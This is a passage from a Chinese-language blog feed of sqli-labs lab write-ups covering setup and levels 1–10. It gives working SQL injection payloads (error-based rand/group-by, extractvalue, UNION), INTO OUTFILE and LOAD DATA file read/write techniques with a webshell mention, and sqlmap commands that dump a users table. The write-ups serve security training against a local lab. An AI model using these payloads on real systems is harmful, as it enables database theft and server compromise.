+&lt;p>When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item value is already present, the row is updated; otherwise, a new row is inserted into the temporary table. If the item has a result field or reference item, it it evaluated twice, once to check whether the result exists in the temporary table and, if not, again while constructing the row to be inserted. When the group by item was nondeterministic, the result value used to check for existence differed from that with which an insert was attempted, causing the insert to be rejected if the value already existed in the table.&lt;/p>
+&lt;p>We fix this by using the hash of any nondeterministic items as the unique constraint, so that the hash is evaluated once only. (Bug #32552332)&lt;/p>
+&lt;/blockquote>
+&lt;p>使用的 MySQL 版本 &amp;gt;=5.7.36 时，Less 5 和 Less 6 使用的 &lt;code>select count(*), concat(version(), '~', floor(rand(14)*2)) x from user group by x;&lt;/code> 不会再报错。这个利用被彻底堵死了。&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="less-5-error-based-double-query">Less-5 Error-Based Double Query&lt;/h2>
+&lt;h3 id="原理">原理&lt;/h3>
+&lt;p>有一篇&lt;a class="link" href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/" target="_blank" rel="noopener"
+>很好的文章&lt;/a>解释了这里的 Double Injection 指的是什么。我尽量概括一下。&lt;/p>
+&lt;p>先忽略 &lt;em>Double Injection&lt;/em> 这个不明所以的名字，它代表技术原理的是利用 &lt;code>group by &amp;lt;col&amp;gt;&lt;/code> 产生临时表，&lt;code>col&lt;/code> 在临时表有唯一性约束，而 MySQL 在违反唯一性约束的错误信息里会提示违反唯一性的&lt;code>col&lt;/code>内容是什么，由此产生信息泄露。&lt;/p>
+&lt;p>以一个案例来解释。下面的查询里&lt;code>version()&lt;/code>是想爆的列，&lt;code>concat(...)&lt;/code>连接目标列和随机数序列构造一个尽可能快出现冲突的&lt;code>group key&lt;/code>。&lt;code>floor(rand(14)*2)&lt;/code>产生的序列前四个结果是&lt;code>1,0,1,0&lt;/code>，插入过程会产生两个&lt;code>rand&lt;/code>调用（一次检查是否存在，一次插入新行），所以可以看成第一次查询&lt;code>1&lt;/code>不存在，插入&lt;code>0&lt;/code>；第二次查询&lt;code>1&lt;/code>不存在，插入&lt;code>0&lt;/code>，报错违反唯一性约束。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">floor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>其中一个比较有趣的点是为什么要用&lt;code>rand&lt;/code>，能不能写一个固定值？&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;hello&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不行，这样做等于&lt;code>group by&lt;/code>常量或者一个列，和普通&lt;code>group by&lt;/code>没区别。&lt;code>rand&lt;/code>发挥的关键作用是扰乱插入更新/插入临时表的过程。这个过程可以理解成这样：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nf">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">group_key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tally&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">group_key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不使用&lt;code>rand&lt;/code>时&lt;code>update&lt;/code>和&lt;code>insert&lt;/code>接收的就是同一个&lt;code>group_key&lt;/code>，使用&lt;code>rand&lt;/code>后&lt;code>update&lt;/code>和&lt;code>insert&lt;/code>就可能用的不是同一个&lt;code>group_key&lt;/code>了，导致进入&lt;code>insert&lt;/code>时插入的是已存在的&lt;code>group_key&lt;/code>。&lt;/p>
+&lt;p>另一个有趣的问题是为什么要有&lt;code>count(*)&lt;/code>？去掉&lt;code>count(*)&lt;/code>就会导致不再报错。&lt;/p>
+&lt;p>等大佬解释。&lt;/p>
+&lt;h3 id="题解">题解&lt;/h3>
+&lt;p>&lt;code>?id=1' union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-2/image-20220510135044215.png"
+width="974"
+height="215"
+srcset="https://weakptr.site/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510135044215"
+class="gallery-image"
+data-flex-grow="453"
+data-flex-basis="1087px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Attention：&lt;/strong> MySQL版本 &amp;gt;=5.7.36 这个解法彻底失效。目前搜索 Double Injection 只有这一个解，如果有别的思路务必告知我。&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="less-6-error-based-double-query">Less-6 Error-Based Double Query&lt;/h2>
+&lt;p>和 Less-5 的区别只在于从单引号换成了双引号。稍微改一改 payload：&lt;code>?id=1&amp;quot; union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-2/image-20220510140208135.png"
+width="1107"
+height="326"
+srcset="https://weakptr.site/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510140208135"
+class="gallery-image"
+data-flex-grow="339"
+data-flex-basis="814px"
+>&lt;/p>
+&lt;h2 id="less-7-dump-into-outfile">Less-7 Dump into Outfile&lt;/h2>
+&lt;blockquote>
+&lt;p>**注意：**这题不要求 Error-Based 了，请注意。&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="原理-1">原理&lt;/h3>
+&lt;p>简而言之，两个方面：&lt;/p>
+&lt;ol>
+&lt;li>利用 MySQL 的 &lt;code>select ... into outfile|dumpfile &amp;lt;filepath&amp;gt;&lt;/code> 语法把查询结果保存到文件。&lt;/li>
+&lt;li>利用 MySQL 的 &lt;code>LOAD DATA&lt;/code> 和 &lt;code>LOAD XML&lt;/code> 语句读出任意文件内容。&lt;/li>
+&lt;/ol>
+&lt;p>第一点可以用作覆盖磁盘上任意文件，通过 SQL 注入实现写入 webshell 或 crontab 等恶意行为。&lt;/p>
+&lt;p>第二点可以从 SQL 注入扩展到任意文件读取，MySQL 权限足够情况下可以拿到很多敏感文件内容。&lt;/p>
+&lt;h3 id="题解-1">题解&lt;/h3>
+&lt;p>本题没有回显，虽然可以按盲注爆破，但题目提示是使用 &lt;code>outfile&lt;/code>。所以最简单的解法就是两步走。&lt;/p>
+&lt;ol>
+&lt;li>注入 &lt;code>SELECT ... INTO DUMPFILE&lt;/code> 导出结果到文件。&lt;/li>
+&lt;li>注入 &lt;code>LOAD DATA&lt;/code> 进而拿到结果。&lt;/li>
+&lt;/ol>
+&lt;p>先确认注入类型：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>?id=1 and 1=0;--%20&lt;/code> 无效&lt;/li>
+&lt;li>&lt;code>?id=1' and 1=0;--%20&lt;/code> 报错&lt;/li>
+&lt;li>&lt;code>?id=1&amp;quot; and 1=0;--%20&lt;/code> 无效&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-2/image-20220510142759400.png"
+width="1106"
+height="320"
+srcset="https://weakptr.site/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510142759400"
+class="gallery-image"
+data-flex-grow="345"
+data-flex-basis="829px"
+>&lt;/p>
+&lt;p>所以是字符型注入，但SQL语句未知，尝试补括号：&lt;code>?id=1') and 1=1;--%20&lt;/code>，依然报错，补两个括号后发现变正常：&lt;code>?id=1')) and 1=1;--%20&lt;/code>。完成注入类型确认。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-2/image-20220510142812936.png"
+width="1100"
+height="337"
+srcset="https://weakptr.site/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510142812936"
+class="gallery-image"
+data-flex-grow="326"
+data-flex-basis="783px"
+>&lt;/p>
+&lt;p>接着把&lt;code>and&lt;/code>条件去掉，改成&lt;code>into outfile '/var/www/html/dump.txt'&lt;/code>，完整 payload：&lt;code>?id=1')) into outfile '/var/www/html/dump.txt';--%20&lt;/code>&lt;/p>
+&lt;blockquote>
+&lt;p>**注意：**docker方式部署请注意，MySQL 镜像默认启用了 &lt;code>--secure-file-priv&lt;/code> 选项，这个选项会禁用 &lt;code>select .. into outfile|dumpfile&lt;/code>，使注入的SQL执行失败。&lt;/p>
+&lt;p>**注意：**docker-compose 方式部署的 sqli-labs 如果把 MySQL 和 PHP+Apache 分开部署，即使&lt;code>select ... into outfile ...&lt;/code> 成功，也无法直接通过 HTTP 方式下载，这一利用也无法继续下去。&lt;/p>
+&lt;/blockquote>
+&lt;p>上述注入如果成功的话可以直接访问 &lt;code>http://localhost:8080/dump.txt&lt;/code> 下载到查询结果了。&lt;/p>
+&lt;h2 id="less-8-blind-boolian">Less-8 Blind Boolian&lt;/h2>
+&lt;p>题目是布尔盲注。确认 SQL 注入类型：&lt;code>?id=1' and 1=1;--%20&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-2/image-20220510144442127.png"
+width="1135"
+height="335"
+srcset="https://weakptr.site/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510144442127"
+class="gallery-image"
+data-flex-grow="338"
+data-flex-basis="813px"
+>&lt;/p>
+&lt;p>典型的盲注，不自己动手了，接下来直接上 sqlmap。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/Less-8/?id=1&amp;#39;&lt;/span> --technique B -p id -T users --dump
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Database: security
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Table: users
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[13 entries]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+------+----------+------------+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| id | username | password |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+------+----------+------------+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 1 | Dumb | Dumb |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 2 | Angelina | I-kill-you |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 3 | Dummy | p@ssword |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 4 | secure | crappy |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 5 | stupid | stupidity |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 6 | superman | genious |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 7 | batman | mob!le |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 8 | admin | admin |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 9 | admin1 | admin1 |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 10 | admin2 | admin2 |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 11 | admin3 | admin3 |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 12 | dhakkan | dumbo |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 14 | admin4 | admin4 |
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+------+----------+------------+
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>done。&lt;/p>
+&lt;h2 id="less-9-blind-time-based">Less-9 Blind Time-Based&lt;/h2>
+&lt;p>基于时间的盲注，先测试注入类型：&lt;code>?id=1' and sleep(1);--%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-2/image-20220510145029175.png"
+width="415"
+height="322"
+srcset="https://weakptr.site/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510145029175"
+class="gallery-image"
+data-flex-grow="128"
+data-flex-basis="309px"
+>&lt;/p>
+&lt;p>确认注入类型成功。接着还是上 sqlmap。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/Less-9/?id=1&amp;#39;&lt;/span> --technique T -p id -T users --dump --count &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>基于时间的盲注非常慢，即使 sqlmap 做了优化，依然非常慢，所以只提取一行。我懒得等就直接 ctrl+c 了。总之，就到这里结束。&lt;/p>
+&lt;h2 id="less-10-blind-time-based-doublequotes">Less-10 Blind Time-Based DoubleQuotes&lt;/h2>
+&lt;p>和 Less-9 一样，换成了双引号。&lt;code>sqlmap&lt;/code>需要加上&lt;code>--level 2&lt;/code>参数，让 &lt;code>sqlmap&lt;/code> 更努力一点。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>两个知识点一个教训。&lt;/p>
+&lt;p>知识点：&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>rand&lt;/code>结合&lt;code>group by&lt;/code>实现报错注入，不过遗憾的是 MySQL 5.7.36 修复了，将来这个技巧算废了。&lt;/li>
+&lt;li>&lt;code>select ... into outfile|dumpfile&lt;/code>和&lt;code>load data&lt;/code>。对MySQL和php分开部署的情况能导出不能下载，MySQL容器默认禁止了文件权限，无法利用。&lt;/li>
+&lt;/ol>
+&lt;p>教训则是接受失败和耐心尝试。尝试 Less-7 的时候，因为多出来的两个右括号，第一次补右括号无效后我差点就放弃尝试直接去看源码了。后来不抱什么希望再补了一个右括号，发现成功了的时候真的很惊喜，甚至有点庆幸。这也算是一次对自己的惰性的胜利吧。&lt;/p>
+&lt;p>虽然啥也没干还是辛苦我自己了。&lt;/p></description></item><item><title>sqli-labs 实验记录 #1</title><link>https://weakptr.site/p/sqli-labs-training-1/</link><pubDate>Mon, 09 May 2022 17:14:46 +0800</pubDate><guid>https://weakptr.site/p/sqli-labs-training-1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>sqli-labs 是一个开源的 SQL 注入学习平台，最近更新已经是 2014 年了，也是个老项目。不过 sqli-labs 提供的靶场更大，包含 4 个难度级别，每个难度十几题，总共 65 题。&lt;/p>
+&lt;p>感觉会比 dvwa 难一大截，用来学 SQL 注入的玩法肯定是绰绰有余了。&lt;/p>
+&lt;p>本篇应该是 sqli-labs &lt;em>Basic Challenges&lt;/em> 系列 WP 的开始。&lt;/p>
+&lt;h2 id="环境搭建">环境搭建&lt;/h2>
+&lt;h3 id="部署方案">部署方案&lt;/h3>
+&lt;p>两种部署方式，一种是在虚拟机里安装 LAMP 环境（包管理或者别的什么一键安装都行），另一种就是 docker 容器化。显然容器化对靶场玩家更友好。所以我选择容器环境。&lt;/p>
+&lt;p>这里使用了一个原 sqli-labs 的分支，&lt;a class="link" href="https://github.com/aljavier/sqli-labs" target="_blank" rel="noopener"
+>aljavier/sqli-labs&lt;/a>，省下自己写 docker-compose 和 dockerfile 找环境适配的时间。未来发现配置有问题再自己改改。&lt;/p>
+&lt;h3 id="虚拟机环境准备">虚拟机环境准备&lt;/h3>
+&lt;p>虚拟机系统选 Ubuntu 或者 Debian ，或者随你喜欢。安装 docker 和 docker-compose，具体步骤自己看文档。&lt;/p>
+&lt;p>可能还有些需要准备的东西，如果宿主机上没有的话可以考虑在虚拟机里安装，比如 &lt;code>sqlmap&lt;/code> ，还有需要命令行直连 MySQL 的话可以再装个 &lt;code>mycli&lt;/code>。其他就是些个人偏好的开发环境，用来写打靶的小工具小脚本什么的。vim 配置 ohmyzsh 这些就不用提了。&lt;/p>
+&lt;h3 id="部署启动">部署启动&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git clone https://ghproxy.com/github.com/aljavier/sqli-labs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> sqli-labs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>我额外干了点可能没必要的事情，因为注意到 &lt;code>index.html&lt;/code>、&lt;code>readme.md&lt;/code> 之类很多文件都有 &lt;code>x&lt;/code> 权限位，这可能是因为在 Windows 上用 Git 提交导致的权限错误，所以我顺便 &lt;code>find . -executable -type f -name '*.html' | xargs -I{} chmod -x&lt;/code> 把权限清理了一下。带&lt;code>x&lt;/code>权限的文件比较多也不只是&lt;code>html&lt;/code>，总之最后是全都去掉了&lt;code>x&lt;/code>权限。&lt;/p>
+&lt;p>之所以说没必要是可能影响之后的注入利用，总之这一步随意。&lt;/p>
+&lt;h2 id="初探">初探&lt;/h2>
+&lt;h3 id="总览">总览&lt;/h3>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509155939222.png"
+width="1920"
+height="935"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509155939222"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="492px"
+>&lt;/p>
+&lt;p>UI设计有点拉。左上角是切换不同难度和重置数据库，可以看到除了 &lt;code>Page-1(Basic Challenges)&lt;/code> 还有 3 个难度。&lt;/p>
+&lt;p>下面的脑图就是这个难度下的 &lt;em>关卡&lt;/em> 了。&lt;/p>
+&lt;h3 id="less-1-error-based-string">Less-1 Error-Based string&lt;/h3>
+&lt;p>随意打开第一题。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509162045531.png"
+width="1065"
+height="293"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509162045531"
+class="gallery-image"
+data-flex-grow="363"
+data-flex-basis="872px"
+>&lt;/p>
+&lt;p>提示输入数字ID作为参数，提示有点模糊，正确做法是在URL里添加&lt;code>?id=1&lt;/code>这样的 query string。上一页有明确提示 &lt;code>single quotes&lt;/code>，这里给一个&lt;code>'&lt;/code>就会报错：&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509162320625.png"
+width="1245"
+height="248"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509162320625"
+class="gallery-image"
+data-flex-grow="502"
+data-flex-basis="1204px"
+>&lt;/p>
+&lt;p>但奇妙的是这里看似是数字型注入，给&lt;code>?id=1 and 1=1&lt;/code>正确返回。但如果多测一下&lt;code>?id=1 and 1=0&lt;/code>就会发现依然是正确返回，所以造成这一结果应该是 php 5.x 的字符串转数字中丢掉了后面的&lt;code>and 1=1&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509162647659.png"
+width="512"
+height="547"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509162647659"
+class="gallery-image"
+data-flex-grow="93"
+data-flex-basis="224px"
+>&lt;/p>
+&lt;p>所以按字符型注入处理即可。确定要补&lt;code>'&lt;/code>之后就可以继续了。这题主题是 Error Based，所以我们构造一个 Error Based 注入。&lt;code>?id=1' and extractvalue(1,concat('~',version())) -- &lt;/code>。注意&lt;code>--&lt;/code>后的空格，浏览器会自动删掉URL前后的空格字符，可以手动在末尾补一个URL编码的空格符&lt;code>%20&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509163203656.png"
+width="1083"
+height="249"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509163203656"
+class="gallery-image"
+data-flex-grow="434"
+data-flex-basis="1043px"
+>&lt;/p>
+&lt;p>到这就完成了利用。&lt;/p>
+&lt;h3 id="less-2-error-based-intiger">Less-2 Error-Based Intiger&lt;/h3>
+&lt;p>应该是想写 Integer。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509163431103.png"
+width="1047"
+height="259"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509163431103"
+class="gallery-image"
+data-flex-grow="404"
+data-flex-basis="970px"
+>&lt;/p>
